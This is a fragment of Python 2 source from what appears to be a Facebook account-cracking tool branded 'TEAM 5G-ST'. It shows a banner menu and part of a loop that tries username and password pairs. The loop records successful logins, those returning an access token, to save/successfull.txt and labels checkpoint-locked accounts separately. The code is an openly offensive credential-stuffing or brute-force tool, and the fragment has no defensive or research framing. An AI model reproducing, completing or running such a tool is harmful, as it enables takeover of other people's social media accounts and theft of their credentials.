...
def menu():
    ...
    print '\x1b[1;91mAUTHOR  : TEAM 5G-ST'
    print '\x1b[1;91mFACEBOOK  : 5G-SPAMMER-TEAM'
    print '\x1b[1;91mGITHUB  : github.com/5gspammingteam'
    print ''
    print 50* '-'
    print '\x1b[1;94m--------------------------------------------------'
    print
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[5G-ST-HACK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[5G-ST-CHECKPOINT]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Login 7 Days]\x1b[0m \n'
